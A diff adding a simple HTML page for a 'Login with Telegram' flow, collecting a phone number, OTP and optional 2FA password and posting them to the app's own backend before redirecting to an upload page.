@@ -1,0 +1,111 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Login with Telegram</title>
+  <meta charset="UTF-8" />
+</head>
+<body>
+  <h2>🔐 Login with Telegram</h2>
+
+  <div id="step1">
+    <label>📱 Phone Number (with +91):</label><br>
+    <input type="text" id="phone" placeholder="+91XXXXXXXXXX" required><br><br>
+    <button onclick="sendCode()">Send OTP</button>
+  </div>
+
+  <div id="step2" style="display:none;">
+    <label>🔑 Enter OTP:</label><br>
+    <input type="text" id="otp" placeholder="12345" required><br><br>
+    <button onclick="verifyCode()">Verify OTP</button>
+  </div>
+
+  <div id="step3" style="display:none;">
+    <label>🔐 Enter 2FA Password:</label><br>
+    <input type="password" id="password" placeholder="Telegram password" required><br><br>
+    <button onclick="verifyPassword()">Submit Password</button>
+  </div>
+
+  <p id="status"></p>
+
+  <script>
+    function sendCode() {
+      const phone = document.getElementById("phone").value.trim();
+      if (!phone.startsWith("+")) {
+        alert("Please include +91 or your country code.");
+        return;
+      }
+
+      fetch("/send_code", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ phone: phone })
+      })
+      .then(res => res.json())
+      .then(data => {
+        if (data.status === "code_sent") {
+          document.getElementById("step1").style.display = "none";
+          document.getElementById("step2").style.display = "block";
+          document.getElementById("status").innerText = "✅ OTP sent to Telegram!";
+        } else {
+          document.getElementById("status").innerText = "❌ " + data.message;
+        }
+      })
+      .catch(() => {
+        document.getElementById("status").innerText = "❌ Network error.";
+      });
+    }
+
+    function verifyCode() {
+      const phone = document.getElementById("phone").value.trim();
+      const code = document.getElementById("otp").value.trim();
+
+      fetch("/verify_code", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ phone: phone, code: code })
+      })
+      .then(res => res.json())
+      .then(data => {
+        if (data.status === "success") {
+          localStorage.setItem("telegram_phone", phone);
+          document.getElementById("status").innerText = "✅ Login successful!";
+          window.location.href = "/upload-page";
+        } else if (data.status === "2fa_required") {
+          document.getElementById("step2").style.display = "none";
+          document.getElementById("step3").style.display = "block";
+          document.getElementById("status").innerText = "🔐 Enter your 2FA password.";
+        } else {
+          document.getElementById("status").innerText = "❌ OTP incorrect or expired.";
+        }
+      })
+      .catch(() => {
+        document.getElementById("status").innerText = "❌ Network error.";
+      });
+    }
+
+    function verifyPassword() {
+      const phone = document.getElementById("phone").value.trim();
+      const password = document.getElementById("password").value;
+
+      fetch("/verify_password", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ phone: phone, password: password })
+      })
+      .then(res => res.json())
+      .then(data => {
+        if (data.status === "success") {
+          localStorage.setItem("telegram_phone", phone);
+          document.getElementById("status").innerText = "✅ Logged in!";
+          window.location.href = "/upload-page";
+        } else {
+          document.getElementById("status").innerText = "❌ 2FA password incorrect.";
+        }
+      })
+      .catch(() => {
+        document.getElementById("status").innerText = "❌ Network error.";
+      });
+    }
+  </script>
+</body>
+</html>
